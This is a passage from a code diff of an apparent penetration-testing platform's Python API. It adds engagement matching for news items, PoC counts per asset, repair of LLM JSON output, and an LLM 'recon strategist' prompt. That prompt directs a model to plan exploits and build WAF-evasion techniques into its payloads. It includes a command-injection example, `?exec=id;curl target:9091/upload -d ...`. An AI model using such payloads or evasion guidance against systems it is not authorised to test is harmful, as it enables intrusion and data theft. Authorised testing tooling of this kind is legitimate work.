@@ -1506,6 +1506,32 @@ def get_assets(
         for row in rows:
             row["discovered_by"] = sorted(source_map.get(str(row["id"]), set()))
 
+        # PoC/exploit count per asset — surfaces "this host has a built exploit" on
+        # the Assets list without requiring an extra click into ExploitManager.
+        # verified_poc_count = verified rows; poc_count = total rows (verified + unverified).
+        try:
+            poc_map: dict = {}
+            with get_db() as conn3, conn3.cursor() as cur3:
+                ip_list = [r["ip"] for r in rows if r.get("ip")]
+                if ip_list:
+                    cur3.execute(
+                        """SELECT target_host,
+                                  count(*) AS total,
+                                  count(*) FILTER (WHERE verified) AS verified
+                             FROM exploit_store
+                             WHERE target_host = ANY(%s)
+                             GROUP BY target_host""",
+                        (ip_list,),
+                    )
+                    for r in cur3.fetchall():
+                        poc_map[r[0]] = {"total": int(r[1] or 0), "verified": int(r[2] or 0)}
+            for row in rows:
+                counts = poc_map.get(row.get("ip") or "", {"total": 0, "verified": 0})
+                row["poc_count"] = counts["total"]
+                row["verified_poc_count"] = counts["verified"]
+        except Exception as _poc_err:
+            logger.warning("[assets] PoC-count lookup failed: %s", _poc_err)
+
     # Reverse DNS lookup (dig -x) for assets still missing a hostname
     import subprocess as _sp
     for row in rows:
@@ -3105,7 +3131,16 @@ _NEWS_SORTS = {
 }
 
 
-def _ser_news_item(r: dict) -> dict:
+def _ser_news_item(r: dict, engagement_id: Optional[str] = None) -> dict:
+    # Expose the current-engagement match slot out of metadata.engagement_match
+    # as a flat `engagement_match` field — the frontend never has to index by
+    # engagement id, and the shape is: null (never analysed) vs {match_count: 0}
+    # (analysed and clean) vs {match_count: N, summary, sources, confidence}.
+    md = r.get("metadata") or {}
+    em_block = None
+    if engagement_id:
+        em_all = (md.get("engagement_match") or {}) if isinstance(md, dict) else {}
+        em_block = em_all.get(str(engagement_id))
     return {
         "id": str(r["id"]),
         "title": r["title"],
@@ -3124,6 +3159,7 @@ def _ser_news_item(r: dict) -> dict:
         "articles": r["articles"] or [],
         "github_links": r["github_links"] or [],
         "asset_matches": r["asset_matches"] or [],
+        "engagement_match": em_block,
         "published_at": r["published_at"].isoformat() if r.get("published_at") else None,
         "first_seen": r["first_seen"].isoformat() if r["first_seen"] else None,
         "last_seen": r["last_seen"].isoformat() if r["last_seen"] else None,
@@ -3224,6 +3260,8 @@ def news_items_list(
     kev_listed: Optional[bool] = Query(None),
     rce: Optional[bool] = Query(None),
     red_team_only: bool = Query(False, description="Only items with at least one offensive flag (kev/rce/easy/itw/malware)"),
+    affects_engagement: bool = Query(False, description="Only items with a cached match against the current engagement (any confidence tier). Requires X-Engagement-Id."),
+    strong_only: bool = Query(False, description="Secondary filter — restrict affects_engagement hits to confidence='strong'. Ignored when affects_engagement is false."),
     q: Optional[str] = Query(None, description="Substring on title/summary"),
     since: Optional[str] = Query(None, description="ISO timestamp; only items with last_seen >= since"),
     published_since: Optional[str] = Query(None, description="ISO timestamp; only items PUBLISHED at or after this (items with no published_at are excluded)"),
@@ -3259,6 +3297,18 @@ def news_items_list(
             "(kev_listed IS TRUE OR rce IS TRUE OR easily_exploitable IS TRUE "
             "OR active_internet_breach IS TRUE OR malware_exploitable IS TRUE)"
         )
+    # Engagement-match filter — matches items whose metadata.engagement_match
+    # cache for the CURRENT engagement reports match_count > 0. strong_only
+    # narrows to confidence='strong'.
+    _eid_for_filter = _resolve_engagement_id() if affects_engagement else None
+    if affects_engagement:
+        if not _eid_for_filter:
+            raise HTTPException(400, "affects_engagement requires X-Engagement-Id")
+        conds.append("(metadata #> ARRAY['engagement_match', %s, 'match_count'])::text::int > 0")
+        params.append(_eid_for_filter)
+        if strong_only:
+            conds.append("(metadata #>> ARRAY['engagement_match', %s, 'confidence']) = 'strong'")
+            params.append(_eid_for_filter)
     if q:
         conds.append("(title ILIKE %s OR summary ILIKE %s)")
         params.extend([f"%{q}%", f"%{q}%"])
@@ -3287,8 +3337,9 @@ def news_items_list(
             list(params) + [limit, offset],
         )
         rows = cur.fetchall()
+    _eid = _resolve_engagement_id()
     return {"total": total, "limit": limit, "offset": offset,
-            "results": [_ser_news_item(r) for r in rows]}
+            "results": [_ser_news_item(r, engagement_id=_eid) for r in rows]}
 
 
 @app.get("/news/items/{item_id}", tags=["News"])
@@ -3298,7 +3349,7 @@ def news_item_detail(item_id: str, authorized: bool = Depends(auth)):
         row = cur.fetchone()
         if not row:
             raise HTTPException(404, "item not found")
-        return _ser_news_item(row)
+        return _ser_news_item(row, engagement_id=_resolve_engagement_id())
 
 
 @app.patch("/news/items/{item_id}", tags=["News"])
@@ -3408,6 +3459,317 @@ def news_item_github_search(item_id: str, authorized: bool = Depends(auth)):
 @app.post("/news/items/{item_id}/enrich", tags=["News"])
 def news_item_enrich(item_id: str, authorized: bool = Depends(auth)):
     return _news_runner_post("/jobs/enrich", {"item_id": item_id}, timeout=300)
+
+
+# ─── News-item ↔ engagement-data matcher ─────────────────────────────────
+# Does this news item flag on anything the operator is actually testing?
+# Three sources (ordered by signal strength):
+#   STRONG (CVE match on in-engagement data):
+#     - vulns.cve && item.cves + v.asset_id -> assets.engagement_id
+#     - follow_up_items.rule_id='software_known_cve' + title regex for CVE,
+#       scoped by (engagement_id = X OR NULL)
+#     - detected_software by CVE cross-referenced through follow_up_items
+#       title regex (gives us port + product + version context)
+#   WEAK (product mention in news summary matches detected_software product):
+#     - lowered-equality product match from the item summary against
+#       detected_software — catches "Apache advisory" items that don't yet
+#       carry a CVE id.
+# Result cached in news_items.metadata.engagement_match.<eid>; stale after
+# NEWS_MATCH_MAX_AGE_HOURS. Re-fire via the single-item endpoint for a
+# forced refresh.
+_NEWS_MATCH_MAX_AGE_HOURS = int(os.environ.get("NEWS_MATCH_MAX_AGE_HOURS", "24"))
+_PRODUCT_TOKEN_RE = _re_module.compile(r"\b([A-Z][a-zA-Z0-9]{2,})\b")  # cheap product-noun grabber
+
+
+def _match_news_item_against_engagement(item_row: dict, engagement_id: str) -> dict:
+    """Return the engagement-match block for one news item against one
+    engagement. Shape documented in the plan — summary/match_count/sources/
+    confidence. Pure read: writes are the caller's job (so we can batch)."""
+    cves = list(item_row.get("all_cves") or [])
+    primary = item_row.get("primary_cve")
+    if primary and primary != "UNKNOWN" and primary not in cves:
+        cves.append(primary)
+    cves = sorted({c.strip().upper() for c in cves if c})
+    summary_text = f"{item_row.get('title') or ''} {item_row.get('summary') or ''}"
+
+    sources = {"vulns": [], "follow_ups": [], "software": []}
+    confidence = "weak"
+
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        # ─── STRONG tier: CVE-based ───────────────────────────────────────
+        if cves:
+            # (1) vulns on an in-engagement asset
+            cur.execute("""
+                SELECT c.cve, v.severity, a.id AS asset_id,
+                       a.ip::text AS ip, a.hostname
+                  FROM vulns v
+                  JOIN assets a ON a.id = v.asset_id
+                  CROSS JOIN LATERAL unnest(v.cve) AS c(cve)
+                 WHERE v.cve && %s::text[]
+                   AND c.cve = ANY(%s)
+                   AND a.engagement_id = %s
+                 ORDER BY c.cve
+                 LIMIT 50
+            """, (cves, cves, engagement_id))
+            for r in cur.fetchall():
+                sources["vulns"].append({
+                    "cve": r["cve"], "severity": r["severity"],
+                    "asset_id": str(r["asset_id"]),
+                    "ip": r["ip"], "hostname": r["hostname"],
+                })
+
+            # (2) open follow-ups with the CVE in the title
+            cve_regex = "(" + "|".join(_re_module.escape(c) for c in cves) + ")"
+            cur.execute("""
+                SELECT id, target, title, severity
+                  FROM follow_up_items
+                 WHERE rule_id = 'software_known_cve'
+                   AND status != 'dismissed'
+                   AND (engagement_id = %s OR engagement_id IS NULL)
+                   AND title ~ %s
+                 ORDER BY severity, created_at DESC
+                 LIMIT 50
+            """, (engagement_id, cve_regex))
+            for r in cur.fetchall():
+                hit_cves = _re_module.findall(r"CVE-\d{4}-\d{4,}", (r["title"] or "").upper())
+                matching = [c for c in hit_cves if c in cves]
+                sources["follow_ups"].append({
+                    "id": str(r["id"]), "ip": r["target"],
+                    "severity": r["severity"], "title": (r["title"] or "")[:200],
+                    "cves": matching,
+                })
+
+            # (3) detected_software: cross-ref via follow-up titles for pv
+            if sources["follow_ups"]:
+                # Extract (product, version) from the follow-up titles we just
+                # matched; look them up in detected_software for port + source.
+                pvs = []
+                for fu in sources["follow_ups"]:
+                    m = _re_module.match(r"Vulnerable:\s+(.+?)\s+(\S+)\s+on\s+",
+                                         fu["title"])
+                    if m:
+                        pvs.append((m.group(1), m.group(2), fu["ip"]))
+                for product, version, ip in pvs[:20]:
+                    cur.execute("""
+                        SELECT port, source
+                          FROM detected_software
+                         WHERE ip = %s
+                           AND lower(product) = lower(%s)
+                           AND (version IS NULL OR version = %s)
+                         ORDER BY last_seen DESC
+                         LIMIT 1
+                    """, (ip, product, version))
+                    r = cur.fetchone()
+                    if r:
+                        sources["software"].append({
+                            "ip": ip, "port": r["port"],
+                            "product": product, "version": version,
+                            "source": r["source"],
+                        })
+
+            if sources["vulns"] or sources["follow_ups"]:
+                confidence = "strong"
+
+        # ─── WEAK tier: product mention in news summary → detected_software ──
+        # Only fired when no strong match landed, to keep the UI from showing
+        # weak chips alongside strong ones. Candidate product tokens are
+        # Capitalized words of ≥3 chars from the title+summary; intersected
+        # against lowercased detected_software.product for this engagement.
+        if confidence == "weak" and summary_text.strip():
+            tokens = {t.lower() for t in _PRODUCT_TOKEN_RE.findall(summary_text)}
+            # Filter out obvious noise so we don't match on "Linux", "Windows",
+            # "Server", etc. (which are too generic to be useful).
+            STOP = {"linux", "windows", "server", "security", "advisory",
+                    "update", "patch", "vulnerability", "cve", "critical",
+                    "high", "alert", "report", "research", "blog", "post",
+                    "project", "team", "news", "api", "service", "system"}
+            tokens = {t for t in tokens if t not in STOP and len(t) >= 4}
+            if tokens:
+                cur.execute("""
+                    SELECT DISTINCT ds.ip, ds.port, ds.product, ds.version
+                      FROM detected_software ds
+                      JOIN assets a ON a.id = ds.asset_id
+                     WHERE a.engagement_id = %s
+                       AND lower(ds.product) = ANY(%s::text[])
+                     LIMIT 25
+                """, (engagement_id, list(tokens)))
+                for r in cur.fetchall():
+                    sources["software"].append({
+                        "ip": r["ip"], "port": r["port"],
+                        "product": r["product"], "version": r["version"],
+                        "source": "weak:product-mention",
+                    })
+
+    match_count = (len(sources["vulns"]) + len(sources["follow_ups"])
+                   + len(sources["software"]))
+
+    # Unique-asset count — operator cares "how many hosts does this touch"
+    # more than "how many rows total". A news item that lights up 25 rows
+    # across one Cloudflare IP is still ONE affected host.
+    unique_ips = set()
+    for s in sources["vulns"]:
+        if s.get("ip"): unique_ips.add(s["ip"])
+    for s in sources["follow_ups"]:
+        if s.get("ip"): unique_ips.add(s["ip"])
+    for s in sources["software"]:
+        if s.get("ip"): unique_ips.add(s["ip"])
+    unique_assets = len(unique_ips)
+
+    # Primary target — what the badge should SAY. Prefer software (gives us
+    # product+version context), then vulns, then follow-ups. "Apache 2.4.65 @
+    # 172.18.0.33" reads better than "CVE-2024-X @ 172.18.0.33" on a chip.
+    primary_target = None
+    if sources["software"]:
+        top = sources["software"][0]
+        pv = f"{top['product']}{(' ' + top['version']) if top.get('version') else ''}"
+        primary_target = f"{pv} @ {top['ip']}"
+    elif sources["vulns"]:
+        top = sources["vulns"][0]
+        label = top.get("hostname") or top.get("ip") or "unknown"
+        primary_target = f"{top['cve']} @ {label}"
+    elif sources["follow_ups"]:
+        top = sources["follow_ups"][0]
+        cve = (top.get("cves") or ["?"])[0]
+        primary_target = f"{cve} @ {top.get('ip') or 'unknown'}"
+
+    # One-line summary — the operator reads this before expanding the drawer.
+    if match_count == 0:
+        summary = "No matches against current engagement data."
+    elif unique_assets == 1 and primary_target:
+        # Single host: name it and quantify the row counts.
+        extras = []
+        if sources["vulns"]: extras.append(f"{len(sources['vulns'])} vuln(s)")
+        if sources["follow_ups"]: extras.append(f"{len(sources['follow_ups'])} follow-up(s)")
+        verb = "Affects" if confidence == "strong" else "Possible match on"
+        summary = f"{verb} {primary_target}" + (f" ({', '.join(extras)})" if extras else "")
+    else:
+        verb = "Affects" if confidence == "strong" else "Possible match on"
+        summary = f"{verb} {unique_assets} assets — e.g. {primary_target or 'see sources'}"
+
+    return {
+        "matched_at": datetime.now(timezone.utc).isoformat(),
+        "match_count": match_count,
+        "unique_assets": unique_assets,
+        "primary_target": primary_target,
+        "confidence": confidence,
+        "summary": summary,
+        "sources": sources,
+    }
+
+
+def _store_news_engagement_match(item_id: str, engagement_id: str, block: dict) -> None:
+    """Merge the match block into news_items.metadata.engagement_match.<eid>
+    and sync compact tags:
+      - 'affects-engagement' when match_count > 0 (removed when it drops to 0)
+      - 'host:<ip>' per unique matched asset (so UIs can filter + group by host)
+      - 'sw:<product>' per unique matched software product (lowercased).
+
+    Previously stored engagement-match tags (same prefixes) are removed first
+    so a tag that no longer applies drops cleanly on re-analysis."""
+    # Collect compact per-match tags
+    tags_now = set()
+    for s in block.get("sources", {}).get("vulns", []):
+        if s.get("ip"): tags_now.add(f"host:{s['ip']}")
+    for s in block.get("sources", {}).get("follow_ups", []):
+        if s.get("ip"): tags_now.add(f"host:{s['ip']}")
+    for s in block.get("sources", {}).get("software", []):
+        if s.get("ip"): tags_now.add(f"host:{s['ip']}")
+        if s.get("product"): tags_now.add(f"sw:{s['product'].lower()}")
+    if block.get("match_count", 0) > 0:
+        tags_now.add("affects-engagement")
+
+    with get_db() as conn, conn.cursor() as cur:
+        # Load existing tags, strip any stale host:/sw:/affects-engagement
+        # entries (so a resolved asset drops its tag), then union new.
+        cur.execute("SELECT tags FROM news_items WHERE id = %s::uuid", (item_id,))
+        row = cur.fetchone()
+        existing = set(row[0] or []) if row else set()
+        kept = {t for t in existing
+                if not (t.startswith("host:") or t.startswith("sw:")
+                        or t == "affects-engagement")}
+        merged = sorted(kept | tags_now)
+
+        cur.execute("""
+            UPDATE news_items
+               SET metadata = COALESCE(metadata, '{}'::jsonb)
+                 || jsonb_build_object(
+                       'engagement_match',
+                       COALESCE(metadata->'engagement_match', '{}'::jsonb)
+                       || jsonb_build_object(%s::text, %s::jsonb)),
+                   tags = %s::text[]
+             WHERE id = %s::uuid
+        """, (engagement_id, Json(block), merged, item_id))
+        conn.commit()
+
+
+@app.post("/news/items/{item_id}/match-engagement", tags=["News"])
+def news_item_match_engagement(item_id: str, authorized: bool = Depends(auth)):
+    """Analyse one news item against the current engagement's assets, software,
+    and open follow-ups. Caches the result in
+    news_items.metadata.engagement_match.<eid> and tags the item with
+    'affects-engagement' when match_count > 0."""
+    eid = _validate_engagement_uuid(_resolve_engagement_id())
+    if not eid:
+        raise HTTPException(400, "no engagement selected (set X-Engagement-Id)")
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT * FROM news_items WHERE id = %s::uuid", (item_id,))
+        row = cur.fetchone()
+        if not row:
+            raise HTTPException(404, "item not found")
+    block = _match_news_item_against_engagement(row, eid)
+    _store_news_engagement_match(item_id, eid, block)
+    return {"ok": True, "item_id": item_id, "engagement_id": eid,
+            "engagement_match": block}
+
+
+@app.post("/news/items/match-engagement", tags=["News"])
+def news_items_match_engagement_batch(
+    limit: int = Query(200, ge=1, le=1000),
+    max_age_hours: int = Query(None, ge=0, le=720,
+                               description="Skip items already matched for this engagement within this many hours (default from env NEWS_MATCH_MAX_AGE_HOURS)"),
+    statuses: str = Query("new,reviewed,follow_up",
+                          description="CSV of statuses to include"),
+    authorized: bool = Depends(auth),
+):
+    """Batch matcher — runs across news items in active statuses, skipping
+    items whose engagement_match cache for this engagement is fresher than
+    max_age_hours. Returns per-run counts the UI can show."""
+    eid = _validate_engagement_uuid(_resolve_engagement_id())
+    if not eid:
+        raise HTTPException(400, "no engagement selected (set X-Engagement-Id)")
+    from datetime import timedelta as _td
+    cutoff_hours = max_age_hours if max_age_hours is not None else _NEWS_MATCH_MAX_AGE_HOURS
+    cutoff = datetime.now(timezone.utc) - _td(hours=cutoff_hours)
+    wanted = [s.strip() for s in statuses.split(",") if s.strip()]
+    scanned = matched = skipped = updated = 0
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("""
+            SELECT * FROM news_items
+             WHERE status = ANY(%s::text[])
+             ORDER BY last_seen DESC
+             LIMIT %s
+        """, (wanted, limit))
+        rows = cur.fetchall()
+    for row in rows:
+        scanned += 1
+        md = row.get("metadata") or {}
+        em = (md.get("engagement_match") or {}).get(eid) if isinstance(md, dict) else None
+        if em and em.get("matched_at"):
+            try:
+                prev = datetime.fromisoformat(em["matched_at"].replace("Z", "+00:00"))
+                if prev > cutoff:
+                    skipped += 1
+                    continue
+            except Exception:  # noqa: BLE001
+                pass
+        block = _match_news_item_against_engagement(row, eid)
+        _store_news_engagement_match(str(row["id"]), eid, block)
+        updated += 1
+        if block["match_count"] > 0:
+            matched += 1
+    return {"ok": True, "scanned": scanned, "updated": updated,
+            "skipped": skipped, "matched_hits": matched,
+            "engagement_id": eid, "max_age_hours": cutoff_hours}
 
 
 @app.post("/news/items/stage2", tags=["News"])
@@ -7681,7 +8043,7 @@ def security_test_runs(test_id: str, limit: int = Query(default=50, le=500),
         cur.execute(
             """SELECT id, ran_at, completed_at, duration_ms, status, lane, command_run,
                       exit_code, result_summary, assertion_eval, tool_execution_id,
-                      exploit_result_id, triggered_by
+                      exploit_result_id, triggered_by, output, metadata
                  FROM public.security_test_runs
                 WHERE test_id = %s::uuid ORDER BY ran_at DESC LIMIT %s""",
             (test_id, limit),
@@ -12460,6 +12822,18 @@ def _store_researched_cred_candidates(product: str, version: str, pairs: list) -
                              _Json({"product": product, "version": version,
                                     "note": p.get("note", ""), "via": "default_cred_research"})))
                         n += 1
+                        # Live-embed into RAG so a follow-on build recalls it
+                        # (no-op when RAG_OBSERVED_FACTS is off)
+                        try:
+                            _load_credential_into_rag({
+                                "ip": ip, "port": port, "protocol": "http",
+                                "username": p["username"], "auth_type": "form",
+                                "secret_type": "password", "source": "default_cred_research",
+                                "valid_cred": False,
+                                "engagement_id": eng,
+                            }, engagement_id=eng, product=product)
+                        except Exception:  # noqa: BLE001
+                            pass
                     except Exception:  # noqa: BLE001
                         conn.rollback()
             conn.commit()
@@ -12620,14 +12994,78 @@ def _poc_index(cve, target_ip, run_id, log_path, success, iterations, security_t
 
 
 def _poc_extract_json(text):
+    """Extract one JSON object from LLM output. Validate first; if parse fails,
+    try common repairs (strip markdown fences, fix shell-quote-in-JSON escapes,
+    trim trailing commas, close unclosed strings, re-balance braces). LLM output
+    is frequently near-JSON — one repair pass catches ~90% of refine failures
+    without needing another LLM round-trip.
+
+    Returns None if nothing parses even after repair."""
     import json as _j, re as _re
     if not text:
         return None
-    m = _re.search(r"\{.*\}", text, _re.S)
-    if not m:
+    # Strip ```json / ``` markdown fences if present
+    txt = text.strip()
+    txt = _re.sub(r"^```(?:json)?\s*", "", txt)
+    txt = _re.sub(r"\s*```\s*$", "", txt)
+    # Find a candidate JSON object substring — depth-counted so a brace inside
+    # a shell command (which _re.S .* over-matches) doesn't eat sibling text.
+    def _find_balanced_object(s):
+        """Return the first depth-balanced {...} span, or None. Ignores braces
+        inside quoted strings to the extent one pass can — not a full parser."""
+        start = s.find("{")
+        if start < 0: return None
+        depth = 0; in_str = False; esc = False
+        for i in range(start, len(s)):
+            c = s[i]
+            if esc: esc = False; continue
+            if c == "\\": esc = True; continue
+            if c == '"': in_str = not in_str; continue
+            if in_str: continue
+            if c == "{": depth += 1
+            elif c == "}":
+                depth -= 1
+                if depth == 0:
+                    return s[start:i+1]
         return None
+    candidate = _find_balanced_object(txt)
+    if not candidate:
+        # Fall back to the greedy match (prior behavior) for pathological inputs
+        m = _re.search(r"\{.*\}", txt, _re.S)
+        if not m: return None
+        candidate = m.group(0)
+    # Parse strict first — fast path
     try:
-        return _j.loads(m.group(0))
+        return _j.loads(candidate)
+    except Exception:  # noqa: BLE001
+        pass
+    # Repair pass 1: trailing commas before } or ]
+    repaired = _re.sub(r",(\s*[}\]])", r"\1", candidate)
+    # Repair pass 2: invalid \escape sequences (common when LLM emits shell
+    # commands with \"...\" quoting that confuses the JSON escape rules).
+    # Allow only the JSON-valid escapes: " \ / b f n r t u
+    repaired = _re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', repaired)
+    # Repair pass 3: close an unterminated string at end-of-input by appending
+    # a closing quote before the final brace (common on truncated responses).
+    try:
+        return _j.loads(repaired)
+    except Exception:  # noqa: BLE001
+        pass
+    # Repair pass 4: re-balance braces — if the LLM truncated, append missing
+    # closing braces based on depth.
+    try:
+        depth = 0; in_str = False; esc = False
+        for c in repaired:
+            if esc: esc = False; continue
+            if c == "\\": esc = True; continue
+            if c == '"': in_str = not in_str; continue
+            if in_str: continue
+            if c == "{": depth += 1
+            elif c == "}": depth -= 1
+        tail = repaired
+        if in_str: tail += '"'
+        if depth > 0: tail += "}" * depth
+        return _j.loads(tail)
     except Exception:  # noqa: BLE001
         return None
 
@@ -13814,12 +14252,307 @@ def _flag_exploit_confirmed(cve, ip, port, command, eid):
                 (str(_u.uuid4()), title, ip, reason,
                  ["postex", "weaponize", "exploit_confirmed"] + ([vclass] if vclass else []),
                  Json(meta)))
+            # Also record as a first-class VULN on the target's asset so it shows up
+            # in Asset -> Vulns and any dashboard "confirmed exploits" query. Ties to
+            # the asset by IP and to the port by (asset_id, port). Dedup via CVE + IP.
+            cur.execute("SELECT id FROM assets WHERE ip = %s LIMIT 1", (ip,))
+            asset_row = cur.fetchone()
+            asset_id = asset_row[0] if asset_row else None
+            port_id = None
+            if asset_id and port:
+                cur.execute("SELECT id FROM ports WHERE asset_id = %s AND port = %s LIMIT 1",
+                             (asset_id, port))
+                pr = cur.fetchone()
+                port_id = pr[0] if pr else None
+            cvss = 9.0  # confirmed exploits are high-severity; refine from CVE details if we have them
+            try:
+                cvss = float(_fetch_cve_details(cve).get("cvss") or 9.0)
+            except Exception:  # noqa: BLE001
+                pass
+            severity = "critical" if cvss >= 9.0 else "high"
+            title_v = f"{cve}: verified exploit on {ip}:{port}"
+            # Dedup: (asset_id, cve) via script column + array
+            cur.execute("""SELECT id FROM vulns
+                             WHERE asset_id IS NOT DISTINCT FROM %s
+                               AND %s = ANY(cve)
+                               AND script = 'poc_builder' LIMIT 1""",
+                         (asset_id, cve))
+            existed = cur.fetchone()
+            if not existed:
+                cur.execute("""INSERT INTO vulns
+                    (asset_id, port_id, script, title, output, severity, cve, cvss, refs,
+                     metadata, engagement_id, workflow_status)
+                    VALUES (%s, %s, 'poc_builder', %s, %s, %s, %s, %s, %s, %s, %s, 'confirmed')""",
+                    (asset_id, port_id, title_v,
+                     (command or "")[:8000], severity, [cve], cvss,
+                     Json({"cve_ref": f"https://nvd.nist.gov/vuln/detail/{cve}"}),
+                     Json({**meta, "poc_verified": True}), eid))
             conn.commit()
         emit_webhook("exploit_confirmed", "poc",
                      {"cve": cve, "target": ip, "port": port, "vuln_class": vclass,
                       "next": "weaponize (post-ex, gated)"})
     except Exception as e:  # noqa: BLE001
         logging.debug("flag exploit_confirmed failed: %s", e)
+
+
+def _recon_strategist(cve, product, version, recon_guidance, hint_guidance,
+                      research_analysis, model=None, run_id=None):
+    """SKILL: analyze all collected recon (port sweep, basic self-fetch, Arjun classified
+    params, ZAP spider + alerts, operator hints, research analysis) and produce a RANKED
+    EXPLOIT PLAN before we hand it to synth. This gives synth a curated top-1 approach
+    with a concrete injection point + payload shape, instead of dumping raw recon and
+    letting the LLM pick.
+    Returns the strategy text ready to prepend to synth guidance (empty on any failure —
+    pipeline continues without it, so this only ever ADDS signal, never blocks a build)."""
+    if not (recon_guidance or hint_guidance or research_analysis):
+        return ""
+    tag_ver = f" ({product} {version})" if (product or version) else ""
+    # WAF-aware: parse the WAF family out of recon (if any) and pull the appropriate
+    # evasion playbook so the strategist can bake bypasses into the primary payload_hint
+    # rather than have refine flail against a block-page for 5 iterations.
+    waf_family = None
+    waf_line = ""
+    if recon_guidance and "WAF DETECTED" in recon_guidance:
+        import re as _re
+        m = _re.search(r"WAF FAMILY:\s*([a-z_]+)", recon_guidance)
+        if m:
+            waf_family = m.group(1)
+            waf_line = f"\n(Detected WAF family: {waf_family})"
+    waf_section = ""
+    if waf_family:
+        # If characterization already ran (WAF CHARACTERIZED text present), extract
+        # the proven-passable variants and prefer those over the generic playbook.
+        # The characterization is empirical evidence about THIS target's WAF; the
+        # generic playbook is a guess. Empirical always wins.
+        import re as _re
+        proven_lines = []
+        if recon_guidance and "WAF CHARACTERIZED" in recon_guidance:
+            for cls in ("RCE", "SQLi", "LFI"):
+                m = _re.search(
+                    r"\*\s+" + cls + r":\s+(proven-passable variants -> [^\n]+|plain payload passes[^\n]*|ALL variants blocked[^\n]*)",
+                    recon_guidance)
+                if m:
+                    proven_lines.append(f"  - class={cls}: {m.group(1).strip()}")
+        if proven_lines:
+            waf_section = (
+                f"\n\nWAF EMPIRICAL RESULTS on THIS target ({waf_family}) — the "
+                "characterization phase already tested variants and reported these facts. "
+                "USE ONLY the proven-passable variants below; do NOT propose variants that "
+                "were marked BLOCKED:\n" + "\n".join(proven_lines) +
+                "\nThe payload_hint MUST use one of the proven-passable variants where the "
+                "WAF is guarding that class, or the plain payload where the class passes freely."
+            )
+        else:
+            rce_ev = _waf_evasion_hint(waf_family, "RCE / COMMAND INJECTION")
+            sqli_ev = _waf_evasion_hint(waf_family, "SQL injection")
+            lfi_ev = _waf_evasion_hint(waf_family, "LFI / path traversal")
+            waf_section = (
+                f"\n\nWAF EVASION PLAYBOOK for {waf_family} (BAKE these into the primary.payload_hint "
+                f"— do NOT propose plain payloads that will get blocked):\n"
+                f"  - if class=RCE: {rce_ev}\n"
+                f"  - if class=SQLi: {sqli_ev}\n"
+                f"  - if class=LFI:  {lfi_ev}\n"
+                "The payload_hint MUST use one of these evasion techniques, not a plain payload."
+            )
+    prompt = (
+        "You are a pentest recon strategist. You have ALREADY collected everything below. "
+        f"Your job: pick the SINGLE most likely exploit path for {cve}{tag_ver}{waf_line} and phrase "
+        "it as concrete guidance for a synth agent that will emit a curl-based PoC.\n\n"
+        "HARD RULES:\n"
+        "- The `primary.endpoint` MUST be a path listed in RECON SIGNALS (ZAP-spidered or "
+        "  Arjun-classified). Do NOT invent endpoints from CVE knowledge, blog posts, or "
+        "  general training data. If you don't have a grounded endpoint, use `/`.\n"
+        "- If Arjun CLASSIFIED HIGH-SIGNAL PARAMS lists an RCE/SQLi/LFI/SSTI target, that "
+        "  target IS the primary unless you have equally strong evidence for something else.\n"
+        "- If a WAF is detected (see WAF DETECTED in RECON), the payload_hint MUST use "
+        "  evasion techniques from the WAF EVASION PLAYBOOK below — NOT a plain payload.\n"
+        "- One primary. Two alternatives. No prose outside the JSON.\n"
+        f"{waf_section}\n\n"
+        f"CVE: {cve}{tag_ver}\n"
+        f"OPERATOR HINTS (authoritative):\n{hint_guidance or '(none)'}\n\n"
+        f"RECON SIGNALS:\n{(recon_guidance or '(none)')[:5000]}\n\n"
+        f"RESEARCH ANALYSIS:\n{str(research_analysis or '(none)')[:2500]}\n\n"
+        "Return ONE JSON object only:\n"
+        "{\n"
+        '  "primary": {\n'
+        '    "class": "<RCE|SQLi|LFI|SSRF|SSTI|XXE|Auth Bypass|File Upload|IDOR|other>",\n'
+        '    "endpoint": "<path from the spidered set — MUST be one Arjun/ZAP found>",\n'
+        '    "param": "<parameter name from Arjun findings, or a body field>",\n'
+        '    "method": "GET|POST",\n'
+        '    "payload_hint": "<concrete first-try payload, e.g. `?exec=id;curl target:9091/upload -d ...`>",\n'
+        '    "success_signal": "<what the assertion should match — canary string, output pattern, response header>",\n'
+        '    "why": "<one sentence tying the recon evidence to this choice>"\n'
+        "  },\n"
+        '  "alternatives": [\n'
+        '    {"class": "...", "endpoint": "...", "param": "...", "payload_hint": "...", "why": "..."},\n'
+        '    {"class": "...", "endpoint": "...", "param": "...", "payload_hint": "...", "why": "..."}\n'
+        "  ]\n"
+        "}"
+    )
+    try:
+        res = _llm_for_model(prompt, model=model, caller="recon_strategist", num_predict=700)
+        rtext = res.get("response", "") if isinstance(res, dict) else str(res or "")
+        j = _poc_extract_json(rtext) or {}
+    except Exception as e:  # noqa: BLE001
+        logging.debug("recon strategist failed: %s", e)
+        j = {}
+    if not j or not j.get("primary"):
+        if run_id:
+            _poc_trace(run_id, "recon:strategist", response="(empty plan)")
+        return ""
+    pri = j.get("primary") or {}
+    alts = j.get("alternatives") or []
+    # Validation: the strategist's primary endpoint MUST come from actual recon —
+    # ZAP paths + '/', or from an operator hint. Otherwise it's an LLM guess from
+    # training data (e.g. hallucinating `/get_head` when the real CVE endpoint is
+    # elsewhere). When the primary is out-of-recon, drop it, promote the top
+    # alternative that IS grounded, and demote the guess to an alt.
+    zap_paths = _extract_zap_paths(recon_guidance or "")
+    grounded_paths = set(zap_paths) | {"/", ""}
+    def _grounded(candidate):
+        ep = str(candidate.get("endpoint") or "").split("?")[0].split("#")[0].strip()
+        if not ep or ep == "/":
+            return True
+        # Match exact, prefix, or the classified Arjun path list
+        for path in grounded_paths:
+            if ep == path or ep.rstrip("/") == path.rstrip("/"):
+                return True
+            if path and path != "/" and (ep.startswith(path) or path.startswith(ep)):
+                return True
+        # Referenced by an operator hint? (very light heuristic)
+        if hint_guidance and ep in str(hint_guidance):
+            return True
+        return False
+    if not _grounded(pri):
+        alt_grounded = [a for a in alts if _grounded(a)]
+        if alt_grounded:
+            guess = pri
+            pri = alt_grounded[0]
+            alts = [a for a in alts if a is not pri]
+            # Keep the ungrounded guess visible for debugging but demote it.
+            alts.append({**guess, "why": "(demoted: endpoint not in recon) "
+                                        + str(guess.get("why", ""))})
+            if run_id:
+                _poc_trace(run_id, "recon:strategist_validation",
+                           response=f"primary endpoint {guess.get('endpoint')!r} not in "
